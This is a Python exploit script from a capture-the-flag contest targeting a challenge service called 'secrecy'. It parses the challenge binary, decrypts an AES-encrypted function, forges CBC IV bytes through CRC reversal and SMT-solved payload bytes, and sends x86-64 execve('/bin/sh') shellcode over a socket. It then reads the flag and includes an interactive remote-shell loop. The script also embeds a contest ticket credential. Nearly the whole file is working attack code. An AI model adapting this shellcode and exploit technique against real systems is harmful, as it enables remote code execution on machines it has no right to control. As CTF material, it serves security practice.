import sys, os
import socket
import time
import binascii
import struct
from Crypto.Cipher import AES
import lightning

FuncOffset = 0x3390
funckey = bytes([0xe1, 0x6c, 0x9b, 0x4d, 0x60, 0xd2, 0xaf, 0x4a, 0x4a, 0x1f, 0xf7, 0x3f, 0xc5, 0x0d, 0x62, 0x5b])

crc_rev_table = {}

def Generate_CRC_Reverse_Table():
	global crc_rev_table
	crc_rev_table = {}
	for i in range(0, 256):
		crc_rev_table[(lightning.crc_table[i] >> 24) & 0xff] = i

def INV(x):
	return (~x) & ((1 << 32) - 1)

def Crc_findReverse(desiredCrc, startCRC):
	global crc_rev_table
	crcIdx = [0] * 4
	patchBytes = [0] * 4

	iterCrc = desiredCrc
	for j in range(3, -1, -1):
		crcIdx[j] = crc_rev_table[iterCrc >> 24]
		iterCrc = ((iterCrc ^ lightning.crc_table[crcIdx[j]]) << 8) & ((1 << 32) - 1)

	crc = startCRC
	for j in range(0, 4):
		patchBytes[j] = (crc ^ crcIdx[j]) & 0xff
		crc = (crc >> 8) ^ lightning.crc_table[patchBytes[j] ^ (crc & 0xff)]

	return patchBytes

def GetExploitIV():
	#we need to generate a block of command bits that gives us a 0, we can only move
	#forward through the buffer of 32 bytes and must xor in the full buffer

	#start our command bits
	IVBits = "0101000" * 15

	#add in xor of 16 bytes
	IVBits += "0011111"

	BitsLeft = (8*14) - len(IVBits)

	if len(IVBits) > (8 * 14):
		return -1, []

	IVBytes = []
	IVBits = IVBits + "0"*(8*14 - len(IVBits))
	Sum = 0
	for i in range(0, len(IVBits), 8):
		IVBytes.append(int(IVBits[i:i+8], 2))
		Sum += IVBytes[-1]

	#get last byte so sum is 0
	IVBytes.append((0x100 - Sum) & 0xff)

	return IVBytes

def GetExploitBytes():
	global FuncOffset

	#open up the local secrecy file and read the IV and bytes of the function
	elffile = open("secrecy", "rb")

	#read the elf header and find the sections to alter

	#get the section offset
	elffile.seek(0x28, os.SEEK_SET)
	section_offset = struct.unpack("<Q", elffile.read(8))[0]

	#get section table details
	elffile.seek(0x3a, os.SEEK_SET)
	(e_shentsize, e_shnum, e_shstrndx) = struct.unpack("<HHH", elffile.read(6))

	#now read all sections
	sections = []
	elffile.seek(section_offset, os.SEEK_SET)
	for i in range(0, e_shnum):
		(sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize) = struct.unpack("<IIQQQQIIQQ", elffile.read(0x40))
		sections.append({"sh_name": sh_name, "sh_type": sh_type, "sh_flags": sh_flags, "sh_addr": sh_addr, "sh_offset": sh_offset, "sh_size": sh_size, "sh_link": sh_link, "sh_info": sh_info, "sh_addralign": sh_addralign, "sh_entsize": sh_entsize})

	#get the section strings
	elffile.seek(sections[e_shstrndx]["sh_offset"], os.SEEK_SET)
	shstr = elffile.read(sections[e_shstrndx]["sh_size"])

	#find .data, note no adjustment for address as objcopy rewrites the offsets
	DataELFEntry = -1
	DataELFSize = -1
	for entry in sections:
		nulloffset = shstr.find(0, entry["sh_name"])
		if shstr[entry["sh_name"]:nulloffset] == b".data":
			DataELFOffset = entry["sh_offset"]
			DataELFSize = entry["sh_size"]
			break

	#we know that the congrats entry is the last entry in the table, go to the end of the data area then work backwards to locate it
	print("Reading data from %08x, len %08x" % (DataELFOffset, DataELFSize))
	elffile.seek(DataELFOffset, os.SEEK_SET)
	elfdata = elffile.read(DataELFSize)

	IVEndOffset = 0
	for i in range(len(elfdata)-8, 0, -8):
		#if not all 0's then we found the IV
		if elfdata[i:i+8] != b"\x00"*8:
			IVEndOffset = i+8
			break

	#move backwards and get the function offset along with the IV data
	IVEndOffset -= 32
	IVData = elfdata[IVEndOffset+16:IVEndOffset+16+16]

	print("EncryptStructData: %s" % (binascii.b2a_hex(elfdata[IVEndOffset:IVEndOffset+16])))
	#get the first 16 bytes of the encrypted function
	elffile.seek(FuncOffset, os.SEEK_SET)
	FuncData = elffile.read(16)
	elffile.close()

	print("Found func at %016lx, IV %s, Data: %s" % (FuncOffset, binascii.b2a_hex(IVData), binascii.b2a_hex(FuncData)))

	#now decrypt the function data
	cipher = AES.new(funckey, AES.MODE_CBC, IVData)
	DecFuncData = cipher.decrypt(FuncData)
	print("Decrypted Func data: %s" % (binascii.b2a_hex(DecFuncData)))

	#setup the payload with a 4 byte crc at the end to match what we require
	#5E    pop rsi
	#93    xchg eax, ebx
	#56    push rsi
	#92    xchg eax, edx
	#0F05  syscall
	#C3    ret
	Payload = [0x5e, 0x93, 0x56, 0x92, 0x0f, 0x05, 0xc3] + [0]*9
	print("Payload CRC", hex(lightning.GetCRC(0, Payload[0:7])))
	
	#grab the bytes from our SMT solving
	smtdata = open("solver.output", "r").read().split("\n")
	for i in range(0, len(smtdata)):
		curline = smtdata[i]
		offset = curline.find("PayloadByte")
		if offset != -1:
			Index = int(curline[offset+11:offset+13])
			Value = int(smtdata[i+1].strip()[2:-1],16)
			Payload[Index] = Value

	#now calculate the needed IV to create these bytes
	print("Payload:", binascii.b2a_hex(bytes(Payload)))

	#xor in the patch bytes leaving the needed bytes, we don't xor in IV as the result is xor'd
	#from the state machine
	DecFuncData = list(DecFuncData)
	IVData = list(IVData)
	NewFuncData = [0]*16
	for i in range(0, len(DecFuncData)):
		NewFuncData[i] = DecFuncData[i] ^ Payload[i]

	print("New IV: %s" % (binascii.b2a_hex(bytes(NewFuncData))))
	return NewFuncData

if __name__ == "__main__":
	lightning.GenerateCRCTable()
	Generate_CRC_Reverse_Table()

	#s = socket.create_connection(("127.0.0.1", 10000))
	s = socket.create_connection(("secrecy-vd34kvensehem.shellweplayaga.me", 10000))
	s.send("ticket{SternBowline8663n22:QL_vWf9X_8lCLEbjQlB3b6vIdKnnybYKGSGFQJcklwa5eHWN}\n".encode("utf-8"))

	time.sleep(0.02)
	s.recv(1024)

	#generate the exploit buffer
	ExploitIV = GetExploitIV()
	ExploitBytes = bytes(GetExploitBytes())
	KeyData = lightning.GetKeyData(s, ExploitBytes)

	#add our last byte for padding
	ExploitIV.append(1)

	#we need to xor the whole string into the buffer
	IV = list(KeyData)
	for i in range(0, len(IV)):
		IV[i] ^= ExploitIV[i]

	IVBytes = (b"0"*32 + binascii.b2a_hex(bytes(IV)))[-32:]

	s.send(ExploitBytes + b"\n")
	s.send(IVBytes + b"\n")
	time.sleep(1)

	s.recv(4096).decode("utf-8")

	#Identity = ExploitBytes
	#KeyData = lightning.GetKeyData(s, Identity)

	#generate the check buffer
	CheckBuffer = lightning.GenerateCheckBuffer(ExploitBytes)

	#figure out command bits
	BitsLeft, CmdBytes = lightning.GetCommandBits(CheckBuffer, ExploitBytes)

	#add our last byte for padding
	CmdBytes.append(1)

	#we need to xor the whole string into the buffer
	IV = list(KeyData)
	for i in range(0, len(IV)):
		IV[i] ^= CmdBytes[i]

	IVBytes = (b"0"*32 + binascii.b2a_hex(bytes(IV)))[-32:]

	s.send(ExploitBytes + b"\n")
	s.send(IVBytes + b"\n")
	time.sleep(1)

	s.recv(4096).decode("utf-8")

	shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

	s.send(shellcode)

	print("Incoming shell")
	time.sleep(1)
	s.send(b"cat flag\n")
	print(s.recv(4096))
	s.close()
	sys.exit(0)

	# Awesome Shell shamelessly stolen from Eindbazen
	# connect stdio to socket until either EOF's. use low-level calls to bypass stdin buffering.
	# also change the tty to character mode so we can have line editing and tab completion.
	import termios, tty, select, os
	old_settings = termios.tcgetattr(0)
	try:
		tty.setcbreak(0)
		c = True
		while c:
			for i in select.select([0, s.fileno()], [], [], 0)[0]:
				c = os.read(i, 1024)
				if c: os.write(s.fileno() if i == 0 else 1, c)
	except KeyboardInterrupt: pass
	finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

	s.close()

